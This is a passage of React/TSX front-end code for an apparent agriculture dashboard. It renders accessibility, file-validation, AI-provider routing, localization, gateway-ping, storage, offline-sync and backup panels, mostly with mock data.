                            addLog("ARIA Labels Toggled", "info", "A11yEngine", `Set focus ARIA visual guides: ${e.target.checked}`);
                          }}
                          className="rounded text-pink-600 w-3.5 h-3.5 cursor-pointer"
                        />
                      </label>
                    </div>

                    {/* Colorblind spectrum simulator */}
                    <div className="space-y-1">
                      <label className="text-[8px] font-black uppercase text-slate-400 block mb-1">Colorblind Vision Simulator Filter</label>
                      <select
                        value={accessibilityColorFilter}
                        onChange={(e) => {
                          setAccessibilityColorFilter(e.target.value as any);
                          addLog("Accessibility Filter Changed", "info", "A11yEngine", `Applied color spectrum adjustment: ${e.target.value}`);
                        }}
                        className="w-full px-2.5 py-1.5 bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-white/5 rounded-xl text-[10px] font-bold dark:text-white"
                      >
                        <option value="none">Normal Color Vision Spectrum</option>
                        <option value="protanopia">Protanopia (Red-Green Deficit / Red-Blind)</option>
                        <option value="deuteranopia">Deuteranopia (Green-Blind)</option>
                        <option value="tritanopia">Tritanopia (Blue-Yellow Deficit / Blue-Blind)</option>
                      </select>
                    </div>

                    {/* Simulation preview target */}
                    <div className="p-3 bg-slate-50 dark:bg-slate-950 rounded-xl space-y-1.5 border border-slate-100 dark:border-white/5">
                      <span className="text-[8px] font-bold text-slate-400 block uppercase">Test Visual Color Swatch</span>
                      <div className="flex gap-1.5 h-5">
                        <div className={`flex-1 rounded ${accessibilityColorFilter === "protanopia" ? "bg-[#555500]" : accessibilityColorFilter === "deuteranopia" ? "bg-[#555500]" : accessibilityColorFilter === "tritanopia" ? "bg-[#ff0000]" : "bg-red-500"}`} />
                        <div className={`flex-1 rounded ${accessibilityColorFilter === "protanopia" ? "bg-[#88aa33]" : accessibilityColorFilter === "deuteranopia" ? "bg-[#333333]" : accessibilityColorFilter === "tritanopia" ? "bg-[#0099ff]" : "bg-green-500"}`} />
                        <div className={`flex-1 rounded ${accessibilityColorFilter === "protanopia" ? "bg-[#0000ff]" : accessibilityColorFilter === "deuteranopia" ? "bg-[#0000aa]" : accessibilityColorFilter === "tritanopia" ? "bg-[#003333]" : "bg-blue-500"}`} />
                        <div className={`flex-1 rounded ${accessibilityColorFilter === "protanopia" ? "bg-[#ffaa00]" : accessibilityColorFilter === "deuteranopia" ? "bg-[#ff9900]" : accessibilityColorFilter === "tritanopia" ? "bg-[#f59e0b]" : "bg-amber-500"}`} />
                      </div>
                      {accessibilityShowAria && (
                        <div className="p-1 bg-yellow-100 text-yellow-800 text-[6px] font-mono rounded mt-1">
                          [role="img"] [aria-label="Color gradient spectrum showing red, green, blue, and amber indices"]
                        </div>
                      )}
                    </div>
                  </div>
                </div>

                {/* Right Column: FILE FORMAT COMPATIBILITY SANDBOX */}
                <div className="p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-4">
                  <div className="space-y-1">
                    <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">5. File Format Signature & Integrity Sandbox</span>
                    <p className="text-[9px] text-slate-400 font-semibold">
                      Drag-and-drop or configure files to test our active validation algorithms. Supported extensions: JPG, PNG, WebP, PDF, CSV, XLSX up to 10MB limit.
                    </p>
                  </div>

                  <form onSubmit={handleValidateCompatFile} className="space-y-3 bg-white dark:bg-slate-900 p-4 rounded-2xl border border-slate-200 dark:border-white/5 text-[10px]">
                    <div>
                      <label className="text-[8px] font-black uppercase text-slate-400 block mb-1">File Name</label>
                      <input 
                        type="text" 
                        value={compatUploadFileName}
                        onChange={(e) => setCompatUploadFileName(e.target.value)}
                        className="w-full px-2.5 py-1.5 bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-white/5 rounded-xl font-bold dark:text-white"
                        required
                      />
                    </div>

                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="text-[8px] font-black uppercase text-slate-400 block mb-1">Reported Format</label>
                        <select
                          value={compatUploadFileType}
                          onChange={(e) => setCompatUploadFileType(e.target.value)}
                          className="w-full px-2.5 py-1.5 bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-white/5 rounded-xl font-bold dark:text-white"
                        >
                          <option value="XLSX">XLSX (Spreadsheet)</option>
                          <option value="CSV">CSV (Text Data)</option>
                          <option value="PDF">PDF (Document)</option>
                          <option value="WEBP">WEBP (Image)</option>
                          <option value="PNG">PNG (Image)</option>
                          <option value="JPG">JPG (Image)</option>
                          <option value="EXE">EXE (Forbidden Binary)</option>
                        </select>
                      </div>

                      <div>
                        <label className="text-[8px] font-black uppercase text-slate-400 block mb-1">File Size (MB)</label>
                        <input 
                          type="number" 
                          step="0.1"
                          value={compatUploadFileSize}
                          onChange={(e) => setCompatUploadFileSize(parseFloat(e.target.value) || 0)}
                          className="w-full px-2.5 py-1.5 bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-white/5 rounded-xl font-bold dark:text-white font-mono"
                          required
                        />
                      </div>
                    </div>

                    <button
                      type="submit"
                      disabled={compatFileValidationStatus === "validating"}
                      className="w-full py-2 bg-slate-900 hover:bg-slate-850 text-white dark:bg-cyan-600 dark:hover:bg-cyan-700 text-xs font-black uppercase rounded-xl transition-all cursor-pointer disabled:opacity-50 border-0"
                    >
                      {compatFileValidationStatus === "validating" ? "Scanning Magic Header..." : "Submit to Security Validator"}
                    </button>
                  </form>

                  {/* Sandboxed diagnostics output */}
                  <div className="bg-slate-950 p-3 rounded-xl border border-slate-850 text-white font-mono text-[8px] leading-relaxed max-h-[100px] overflow-y-auto">
                    {compatFileValidationLog.map((line, idx) => (
                      <div key={idx} className={line.startsWith("❌") ? "text-rose-400" : line.startsWith("✓") ? "text-emerald-400" : line.startsWith("🟢") ? "text-cyan-400 font-extrabold" : "text-slate-300"}>
                        {line}
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              {/* TWO COLUMN GRID: Pluggable AI Service Provider Router & Localization Suite */}
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                
                {/* Left Column: PLUGGABLE AI ROUTER */}
                <div className="lg:col-span-2 p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-4">
                  <div className="space-y-1">
                    <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">6. Pluggable AI Model Provider & Routing Gateway</span>
                    <p className="text-[9px] text-slate-400 font-semibold">
                      AgriMind uses a unified abstract AI service layer. If Google Gemini experiences high latencies or outages, the routing gateway dynamically diverts prompts to OpenAI or local fallbacks.
                    </p>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                    {/* Control Form */}
                    <form onSubmit={handleRouteAiRequest} className="space-y-3 bg-white dark:bg-slate-900 p-4 rounded-2xl border border-slate-150 dark:border-white/5 text-[10px] md:col-span-1">
                      <div>
                        <label className="text-[8px] font-black uppercase text-slate-400 block mb-1">Target AI Provider</label>
                        <select
                          value={compatSelectedAiProvider}
                          onChange={(e) => {
                            setCompatSelectedAiProvider(e.target.value as any);
                            addLog("AI Provider Interceptor Changed", "info", "ModularAiRouter", `Switched standard abstract provider to: ${e.target.value.toUpperCase()}`);
                          }}
                          className="w-full px-2.5 py-1.5 bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-white/5 rounded-xl font-bold dark:text-white"
                        >
                          <option value="gemini">Google Gemini 1.5 Flash (Primary)</option>
                          <option value="openai">OpenAI GPT-4o-Mini (Hot Backup)</option>
                          <option value="local">Ollama Local LLaMA 3.1 (Offline Failsafe)</option>
                          <option value="llama">LLaMA 3-70B on Replicate (Cloud Backup)</option>
                        </select>
                      </div>

                      <div>
                        <label className="text-[8px] font-black uppercase text-slate-400 block mb-1">Test Prompt Input</label>
                        <textarea 
                          value={compatAiPromptInput}
                          onChange={(e) => setCompatAiPromptInput(e.target.value)}
                          className="w-full h-16 px-2.5 py-1.5 bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-white/5 rounded-xl font-bold dark:text-white resize-none"
                          required
                        />
                      </div>

                      <button
                        type="submit"
                        disabled={compatAiIsRouting}
                        className="w-full py-2.5 bg-slate-900 hover:bg-slate-850 text-white dark:bg-cyan-600 dark:hover:bg-cyan-700 text-xs font-black uppercase rounded-xl transition-all disabled:opacity-50 cursor-pointer border-0"
                      >
                        {compatAiIsRouting ? "Executing Route..." : "Dispatch Routed AI Session"}
                      </button>
                    </form>

                    {/* AI Routing Terminal Output */}
                    <div className="md:col-span-2 bg-slate-950 p-4 rounded-2xl border border-slate-800 flex flex-col justify-between text-white font-mono text-[9px] leading-relaxed">
                      <div className="space-y-1">
                        <div className="flex items-center justify-between border-b border-slate-800 pb-1.5 mb-1.5 text-[8px] text-cyan-400 font-black uppercase">
                          <span>Abstract Provider Interface Handshake Console</span>
                          <span>ROUTER_ACTIVE: OK</span>
                        </div>
                        <div className="space-y-1 max-h-[140px] overflow-y-auto">
                          {compatAiRoutingLog.map((line, idx) => (
                            <div key={idx} className={line.startsWith("✓") ? "text-emerald-400" : line.startsWith("🟢") ? "text-cyan-400 font-bold" : line.startsWith("⚡") ? "text-pink-400 font-bold" : "text-slate-300"}>
                              {line}
                            </div>
                          ))}
                        </div>
                      </div>

                      <div className="text-[8px] text-slate-500 border-t border-slate-800 pt-1.5 mt-1.5 flex justify-between items-center flex-wrap gap-2">
                        <span>Dynamic Fallback: ENABLED</span>
                        <span>Multi-Model API Binding: STABLE</span>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Right Column: LOCALIZATION SUITE PREPARATION */}
                <div className="p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-4">
                  <div className="space-y-1">
                    <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">7. Multi-Language & Regional Localization Preview</span>
                    <p className="text-[9px] text-slate-400 font-semibold">
                      Test visual templates against regional timezones, language bundles (English, Tagalog/Filipino, Ilokano), and local currencies to verify dynamic layout scaling.
                    </p>
                  </div>

                  <div className="bg-white dark:bg-slate-900 p-4 border border-slate-150 dark:border-white/5 rounded-2xl space-y-3.5 text-[10px]">
                    <div className="grid grid-cols-3 gap-2">
                      <div>
                        <label className="text-[7px] font-black uppercase text-slate-400 block mb-1">Language</label>
                        <select
                          value={compatLanguage}
                          onChange={(e) => {
                            setCompatLanguage(e.target.value as any);
                            addLog("Language Locale Adjusted", "info", "LocalizationEngine", `Switched locale parameter: ${e.target.value.toUpperCase()}`);
                          }}
                          className="w-full px-2 py-1 bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-white/5 rounded-lg font-bold dark:text-white"
                        >
                          <option value="en">English (US)</option>
                          <option value="ph">Filipino</option>
                          <option value="il">Ilokano</option>
                        </select>
                      </div>

                      <div>
                        <label className="text-[7px] font-black uppercase text-slate-400 block mb-1">Timezone</label>
                        <select
                          value={compatTimezone}
                          onChange={(e) => {
                            setCompatTimezone(e.target.value as any);
                            addLog("Timezone Locale Adjusted", "info", "LocalizationEngine", `Switched timezone parameter: ${e.target.value}`);
                          }}
                          className="w-full px-2 py-1 bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-white/5 rounded-lg font-bold dark:text-white"
                        >
                          <option value="Asia/Manila">Manila (PHT)</option>
                          <option value="UTC">UTC (GMT)</option>
                          <option value="EST">New York (EST)</option>
                        </select>
                      </div>

                      <div>
                        <label className="text-[7px] font-black uppercase text-slate-400 block mb-1">Currency</label>
                        <select
                          value={compatCurrency}
                          onChange={(e) => {
                            setCompatCurrency(e.target.value as any);
                            addLog("Currency Locale Adjusted", "info", "LocalizationEngine", `Switched currency parameter: ${e.target.value}`);
                          }}
                          className="w-full px-2 py-1 bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-white/5 rounded-lg font-bold dark:text-white"
                        >
                          <option value="PHP">Philippine Peso (₱)</option>
                          <option value="USD">US Dollar ($)</option>
                        </select>
                      </div>
                    </div>

                    {/* Regional Format Display Swatch */}
                    <div className="p-3 bg-slate-50 dark:bg-slate-950 rounded-xl space-y-2 border border-slate-100 dark:border-white/5 font-mono text-[9px]">
                      <div className="flex justify-between items-center">
                        <span className="text-slate-400 font-bold">Translated Greeting:</span>
                        <span className="font-extrabold text-slate-900 dark:text-white">
                          {compatLanguage === "en" ? "Welcome Back, Farmer!" : compatLanguage === "ph" ? "Maligayang Pagbabalik, Magsasaka!" : "Naimbag nga Isasangbay, Mannalon!"}
                        </span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-slate-400 font-bold">Current Local Time:</span>
                        <span className="text-slate-800 dark:text-slate-200 font-extrabold">
                          {compatTimezone === "Asia/Manila" ? "12:23 PM (PHT)" : compatTimezone === "UTC" ? "04:23 AM (UTC)" : "11:23 PM (EST -1d)"}
                        </span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-slate-400 font-bold">Market Price Format:</span>
                        <span className="text-slate-800 dark:text-slate-200 font-extrabold text-cyan-600">
                          {compatCurrency === "PHP" ? "₱24.50 PHP / kg" : "$0.48 USD / kg"}
                        </span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-slate-400 font-bold">Hectare Area unit:</span>
                        <span className="text-slate-800 dark:text-slate-200 font-extrabold font-mono">2.50 Hectares (25,000 m²)</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* INTEGRATION GATEWAY CONTROL matrix */}
              <div className="p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-4">
                <div className="space-y-1">
                  <span className="text-[10px] font-black uppercase text-pink-600 dark:text-pink-400 tracking-wider block">8. External Pluggable Gateway Connectors & Handshakes</span>
                  <p className="text-[9px] text-slate-400 font-semibold">
                    Ensure third-party external connectors operate in isolated, modular files. Click 'Test Handshake Connection' to trigger mock RESTful schema contract checks with public endpoints.
                  </p>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4">
                  {[
                    { id: "weather", title: "PAGASA Radar API", desc: "v2.1 Weather Forecast", provider: "Government Node" },
                    { id: "sensors", title: "IoT Field Probes", desc: "Soil Moisture Sigfox", provider: "Municipal Gateway" },
                    { id: "gis", title: "Zambales GIS Hub", desc: "PostGIS WMS/WFS Layers", provider: "Provincial GIS" },
                    { id: "gov_data", title: "DA RSBSA Registry", desc: "Farmer Identity Verification", provider: "National Gov API" },
                    { id: "sms", title: "SMS Broadcast Hub", desc: "Botolan Pest Alerts", provider: "Twilio/Chikka Gateway" }
                  ].map((gateway) => {
                    const status = integrationPingStatus[gateway.id] || "idle";
                    return (
                      <div key={gateway.id} className="p-4 bg-white dark:bg-slate-900 border border-slate-150 dark:border-white/5 rounded-2xl flex flex-col justify-between gap-3 min-h-[120px]">
                        <div>
                          <div className="flex items-center justify-between mb-1.5">
                            <span className="text-[8px] font-black uppercase text-slate-400 tracking-wider">{gateway.provider}</span>
                            <span className={`w-1.5 h-1.5 rounded-full ${
                              status === "success" 
                                ? "bg-emerald-500" 
                                : status === "error" 
                                  ? "bg-rose-500 animate-pulse" 
                                  : "bg-slate-300"
                            }`} />
                          </div>
                          <h4 className="text-[11px] font-extrabold text-slate-800 dark:text-white leading-snug">{gateway.title}</h4>
                          <span className="text-[8px] text-slate-400 font-semibold block mt-0.5">{gateway.desc}</span>
                        </div>

                        <div className="space-y-1.5">
                          {status === "success" ? (
                            <div className="p-1 bg-emerald-50 text-emerald-700 dark:bg-emerald-950/20 dark:text-emerald-400 text-[8px] font-bold rounded text-center">
                              ✓ Handshake Compliant
                            </div>
                          ) : status === "error" ? (
                            <div className="p-1 bg-rose-50 text-rose-700 dark:bg-rose-950/20 dark:text-rose-400 text-[8px] font-bold rounded text-center">
                              ⚠ Handshake Timeout
                            </div>
                          ) : status === "pinging" ? (
                            <div className="p-1 bg-pink-50 text-pink-700 dark:bg-pink-950/20 dark:text-pink-400 text-[8px] font-bold rounded text-center animate-pulse">
                              ⏳ Sending Schema Ping...
                            </div>
                          ) : (
                            <div className="p-1 bg-slate-50 text-slate-500 dark:bg-slate-950/50 text-[8px] font-bold rounded text-center">
                              Standby Mode
                            </div>
                          )}

                          <button
                            type="button"
                            onClick={() => handlePingConnector(gateway.id)}
                            disabled={status === "pinging"}
                            className="w-full py-1.5 bg-slate-900 hover:bg-slate-850 text-white dark:bg-cyan-600 dark:hover:bg-cyan-700 text-[8px] font-black uppercase rounded-lg transition-colors cursor-pointer border-0"
                          >
                            {status === "pinging" ? "Pinging..." : "Test Handshake"}
                          </button>
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>
            </div>
          )}

          {/* TAB: ENTERPRISE MASTER STORAGE & GIS ARCHITECTURE */}
          {activeSubTab === "storage" && (
            <DatabaseHubTab
              dbRecordsCount={dbRecordsCount}
              setDbRecordsCount={setDbRecordsCount}
              farmProfiles={farmProfiles}
              setFarmProfiles={setFarmProfiles}
              addLog={addLog}
            />
          )}

          {/* DUMMY STORAGE BLOCK FOR SEQUENTIAL REMOVAL */}
          {activeSubTab === "storage_to_delete" && (
            <div className="bg-white dark:bg-slate-900 p-8 rounded-3xl border border-slate-150 dark:border-white/5 shadow-sm space-y-8 animate-fade-in">

              {/* GRID SECTION 2 & 3: POSTGIS GEOSPATIAL AND CLOUD OBJECT METADATA */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {/* Section 2: PostGIS Geospatial Queries */}
                <div className="p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-4">
                  <div className="space-y-1">
                    <span className="text-[10px] font-black uppercase text-cyan-600 dark:text-cyan-400 tracking-wider block">2. PostGIS Spatial Intersection Boundary Engine</span>
                    <p className="text-[9px] text-slate-400 font-semibold">
                      Leverage PostgreSQL PostGIS spatial queries to map farm coordinates and detect overlaps with municipal flood susceptibility overlays.
                    </p>
                  </div>

                  {/* Selector Controls */}
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-1">
                      <label className="text-[8px] font-black uppercase text-slate-400 block">Target Farm Area</label>
                      <select
                        value={spatialTargetFarm}
                        onChange={(e) => setSpatialTargetFarm(e.target.value)}
                        className="w-full text-[10px] p-2 rounded-xl bg-white dark:bg-slate-950 border border-slate-200 dark:border-slate-800 text-slate-800 dark:text-slate-100 font-bold focus:outline-none cursor-pointer"
                      >
                        <option value="550e8400-e29b-41d4-a716-446655440001">Mang Juan Farm (2.5 ha - Poblacion)</option>
                        <option value="550e8400-e29b-41d4-a716-446655440002">Aling Nena Fields (1.8 ha - Batonlapoc)</option>
                        <option value="550e8400-e29b-41d4-a716-446655440003">Mang Tomas Field (3.2 ha - Carael)</option>
                      </select>
                    </div>

                    <div className="space-y-1">
                      <label className="text-[8px] font-black uppercase text-slate-400 block">GIS Overlay Query Layer</label>
                      <select
                        value={selectedGisLayer}
                        onChange={(e: any) => setSelectedGisLayer(e.target.value)}
                        className="w-full text-[10px] p-2 rounded-xl bg-white dark:bg-slate-950 border border-slate-200 dark:border-slate-800 text-slate-800 dark:text-slate-100 font-bold focus:outline-none cursor-pointer"
                      >
                        <option value="farms">MultiPolygon Centroids (Farms)</option>
                        <option value="barangays">Barangay Boundaries (ST_Contains)</option>
                        <option value="flood">Flood Susceptibility Zone (ST_Intersects)</option>
                      </select>
                    </div>
                  </div>

                  {/* Terminal Results Screen */}
                  <div className="space-y-2">
                    <div className="flex justify-between items-center text-[8px] font-black text-slate-400">
                      <span>PostGIS Spatial Query Console Output</span>
                      <span className="text-cyan-500 uppercase font-mono">EPSG:4326 WGS84</span>
                    </div>

                    <div className="relative">
                      <pre className="p-4 bg-slate-900 text-emerald-400 rounded-2xl border border-slate-800 text-[8px] font-mono leading-relaxed h-44 overflow-y-auto scrollbar-thin">
                        <code>{spatialIntersectionResult}</code>
                      </pre>
                      {isQueryingSpatial && (
                        <div className="absolute inset-0 bg-slate-950/80 rounded-2xl flex flex-col items-center justify-center space-y-2">
                          <RefreshCw className="w-6 h-6 text-cyan-400 animate-spin" />
                          <span className="text-[9px] text-cyan-400 font-mono tracking-widest uppercase">Calculating Polygons...</span>
                        </div>
                      )}
                    </div>

                    <button
                      onClick={handleRunSpatialQuery}
                      disabled={isQueryingSpatial}
                      className="w-full py-2 bg-slate-900 hover:bg-slate-800 dark:bg-cyan-600 dark:hover:bg-cyan-700 text-white text-[10px] font-black uppercase rounded-xl transition-all cursor-pointer flex items-center justify-center gap-2"
                    >
                      <MapPin className="w-3.5 h-3.5" />
                      <span>Query Spatial Boundaries (ST_Intersects)</span>
                    </button>
                  </div>
                </div>

                {/* Section 3: Object Storage Meta-Reference Engine */}
                <div className="p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-4 flex flex-col justify-between">
                  <div className="space-y-4">
                    <div className="space-y-1">
                      <span className="text-[10px] font-black uppercase text-cyan-600 dark:text-cyan-400 tracking-wider block">3. CDN Cloud Object Storage & Meta-Reference Manager</span>
                      <p className="text-[9px] text-slate-400 font-semibold">
                        Avoid storing heavy files or crop photos directly in SQL. Upload to CDN object buckets, then commit the URL strings in relational tables.
                      </p>
                    </div>

                    <form onSubmit={handleUploadStorageFile} className="grid grid-cols-2 gap-4">
                      <div className="space-y-1">
                        <label className="text-[8px] font-black uppercase text-slate-400 block">Simulate File Asset Selection</label>
                        <select
                          value={mockFileToUpload}
                          onChange={(e) => {
                            setMockFileToUpload(e.target.value);
                            if (e.target.value === "soil_analysis_recomp.pdf") {
                              setMockFileSizeToUpload("1.2 MB");
                              setFileCategory("report");
                            } else if (e.target.value === "extreme_heat_advisory.pdf") {
                              setMockFileSizeToUpload("340 KB");
                              setFileCategory("report");
                            } else if (e.target.value === "palay_rice_blast_zoom.jpg") {
                              setMockFileSizeToUpload("2.4 MB");
                              setFileCategory("pest");
                            } else {
                              setMockFileSizeToUpload("1.8 MB");
                              setFileCategory("pest");
                            }
                          }}
                          className="w-full text-[10px] p-2 rounded-xl bg-white dark:bg-slate-950 border border-slate-200 dark:border-slate-800 text-slate-800 dark:text-slate-100 font-bold focus:outline-none cursor-pointer"
                        >
                          <option value="rice_ear_bug_damage.jpg">rice_ear_bug_damage.jpg (1.8 MB)</option>
                          <option value="palay_rice_blast_zoom.jpg">palay_rice_blast_zoom.jpg (2.4 MB)</option>
                          <option value="soil_analysis_recomp.pdf">soil_analysis_recomp.pdf (1.2 MB)</option>
                          <option value="extreme_heat_advisory.pdf">extreme_heat_advisory.pdf (340 KB)</option>
                        </select>
                      </div>

                      <div className="space-y-1">
                        <label className="text-[8px] font-black uppercase text-slate-400 block">Database Meta Class Ref</label>
                        <div className="px-3 py-2 bg-white dark:bg-slate-950 rounded-xl border border-slate-200 dark:border-slate-800 text-[10px] font-black text-cyan-600 dark:text-cyan-400 uppercase">
                          {fileCategory}
                        </div>
                      </div>

                      <div className="col-span-2">
                        <button
                          type="submit"
                          disabled={isUploadingStorage}
                          className="w-full py-2 bg-slate-900 hover:bg-slate-800 dark:bg-cyan-600 dark:hover:bg-cyan-700 text-white text-[10px] font-black uppercase rounded-xl transition-all cursor-pointer flex items-center justify-center gap-2"
                        >
                          <Upload className="w-3.5 h-3.5" />
                          <span>{isUploadingStorage ? "Uploading CDN Object..." : "Upload File & Sync Meta-Ref"}</span>
                        </button>
                      </div>
                    </form>
                  </div>

                  {/* Registered files metadata list */}
                  <div className="space-y-2 mt-4">
                    <span className="text-[8px] font-black uppercase text-slate-400 block">Relational File Registry Table (`file_storage_registry`)</span>
                    <div className="max-h-28 overflow-y-auto space-y-1 border border-slate-200 dark:border-slate-800 rounded-2xl p-2 bg-white dark:bg-slate-950/20 scrollbar-thin">
                      {storageFileList.map((file) => (
                        <div key={file.id} className="flex justify-between items-center text-[8px] font-bold p-1.5 border-b border-slate-100 dark:border-slate-800/60 last:border-0 leading-tight">
                          <div>
                            <span className="text-slate-800 dark:text-white font-mono block">{file.originalName}</span>
                            <span className="text-slate-400 truncate block max-w-xs font-semibold">{file.secureUrl}</span>
                          </div>
                          <div className="text-right shrink-0">
                            <span className="text-cyan-600 dark:text-cyan-400 font-mono block">{file.size}</span>
                            <span className="text-slate-400 block text-[7px] font-semibold">{file.uploadedAt}</span>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </div>

              {/* GRID SECTION 4 & 5: OFFLINE SYNC AND BACKUP RESTORER */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {/* Section 4: Offline Synchronization & Conflict resolution */}
                <div className="p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-4">
                  <div className="space-y-1">
                    <span className="text-[10px] font-black uppercase text-cyan-600 dark:text-cyan-400 tracking-wider block">4. Offline-First Background Sync & Conflict Resolution Board</span>
                    <p className="text-[9px] text-slate-400 font-semibold">
                      AgriMind supports field technicians working in poor connectivity zones. Simulating a sync conflict where Local and Server parameters differ.
                    </p>
                  </div>

                  {/* State conflict visualizers */}
                  <div className="grid grid-cols-2 gap-4">
                    {/* Local Mobile State */}
                    <div className="p-3 bg-amber-50 dark:bg-amber-950/20 border border-amber-200/50 rounded-2xl space-y-1.5 relative overflow-hidden">
                      <div className="absolute top-1 right-2 px-1 bg-amber-500 rounded text-[6px] font-black uppercase text-white">Local Phone</div>
                      <span className="text-[8px] text-slate-400 block font-black uppercase">Offline Edit State</span>
                      <div className="text-[10px] font-bold text-slate-800 dark:text-slate-100">
                        <span className="block"><strong className="text-slate-400 text-[8px]">AREA:</strong> {clientFarmVal.area} Hectares</span>
                        <span className="block truncate"><strong className="text-slate-400 text-[8px]">CROP:</strong> {clientFarmVal.cropType}</span>
                        <span className="block text-[8px] text-slate-400 mt-1 font-semibold">{clientFarmVal.lastModified}</span>
                      </div>
                    </div>

                    {/* Remote Server State */}
                    <div className="p-3 bg-cyan-50 dark:bg-cyan-950/20 border border-cyan-200/50 rounded-2xl space-y-1.5 relative overflow-hidden">
                      <div className="absolute top-1 right-2 px-1 bg-cyan-500 rounded text-[6px] font-black uppercase text-white">Server SQL</div>
                      <span className="text-[8px] text-slate-400 block font-black uppercase">Remote Database State</span>
                      <div className="text-[10px] font-bold text-slate-800 dark:text-slate-100">
                        <span className="block"><strong className="text-slate-400 text-[8px]">AREA:</strong> {serverFarmVal.area} Hectares</span>
                        <span className="block truncate"><strong className="text-slate-400 text-[8px]">CROP:</strong> {serverFarmVal.cropType}</span>
                        <span className="block text-[8px] text-slate-400 mt-1 font-semibold">{serverFarmVal.lastModified}</span>
                      </div>
                    </div>
                  </div>

                  {/* Sync Action Selector */}
                  <div className="space-y-3">
                    <span className="text-[8px] font-black uppercase text-slate-400 block">Choose Resolution Matrix</span>
                    
                    <div className="grid grid-cols-3 gap-2">
                      <button
                        onClick={() => handleResolveConflict("client")}
                        className={`py-1.5 text-center text-[8px] font-black uppercase rounded-lg border cursor-pointer transition-all ${
                          resolutionStrategy === "client"
                            ? "bg-amber-500 text-white border-amber-500 shadow-sm"
                            : "bg-white dark:bg-slate-950 text-slate-500 border-slate-250 dark:border-slate-800 hover:text-slate-800 hover:bg-slate-100"
                        }`}
                      >
                        Local Wins
                      </button>
                      <button
                        onClick={() => handleResolveConflict("server")}
                        className={`py-1.5 text-center text-[8px] font-black uppercase rounded-lg border cursor-pointer transition-all ${
                          resolutionStrategy === "server"
                            ? "bg-cyan-500 text-white border-cyan-500 shadow-sm"
                            : "bg-white dark:bg-slate-950 text-slate-500 border-slate-250 dark:border-slate-800 hover:text-slate-800 hover:bg-slate-100"
                        }`}
                      >
                        Server Wins
                      </button>
                      <button
                        onClick={() => handleResolveConflict("three-way")}
                        className={`py-1.5 text-center text-[8px] font-black uppercase rounded-lg border cursor-pointer transition-all ${
                          resolutionStrategy === "three-way"
                            ? "bg-purple-500 text-white border-purple-500 shadow-sm"
                            : "bg-white dark:bg-slate-950 text-slate-500 border-slate-250 dark:border-slate-800 hover:text-slate-800 hover:bg-slate-100"
                        }`}
                      >
                        Three-Way Merge
                      </button>
                    </div>

                    {/* Sync Action Daemon Monitor */}
                    <div className="p-3 bg-slate-900 rounded-2xl border border-slate-800 space-y-1.5 h-24 overflow-y-auto scrollbar-thin">
                      <span className="text-[7px] text-slate-500 font-black block uppercase">Sync Coordinator Stream Logs</span>
                      <div className="space-y-1 font-mono text-[8px] text-emerald-400 leading-normal">
                        {syncLogs.map((log, idx) => (
                          <div key={idx} className="flex gap-1">
                            <span className="text-slate-500 font-bold shrink-0">[{idx + 1}]</span>
                            <span>{log}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  </div>
                </div>

                {/* Section 5: Backup Scheduler & Restoration testing */}
                <div className="p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-4">
                  <div className="space-y-1">
                    <span className="text-[10px] font-black uppercase text-cyan-600 dark:text-cyan-400 tracking-wider block">5. Backup Rotation Schedule & Restore Test Auditor</span>
                    <p className="text-[9px] text-slate-400 font-semibold">
                      Verify cryptographically encrypted backups. Trigger manual snapshots (Daily Incremental, Weekly Full, Monthly Archive) and run restoration trials.
                    </p>
                  </div>

                  {/* Backup snapshot selector list */}
                  <div className="space-y-1.5">
                    <label className="text-[8px] font-black uppercase text-slate-400 block">Select Backup Snapshot to Verify</label>
                    <select
                      value={selectedRestoreBackupId}
                      onChange={(e) => {
                        setSelectedRestoreBackupId(e.target.value);
                        setRestoreVerificationStatus("idle");
                        setRestorationLog([]);
                      }}
                      className="w-full text-[10px] p-2 rounded-xl bg-white dark:bg-slate-950 border border-slate-200 dark:border-slate-800 text-slate-800 dark:text-slate-100 font-bold focus:outline-none cursor-pointer"
                    >
                      {backupLogs.map((b) => (
                        <option key={b.id} value={b.id}>
                          {b.filename} ({b.size} - {b.type.toUpperCase()})
                        </option>
                      ))}
                    </select>
                  </div>

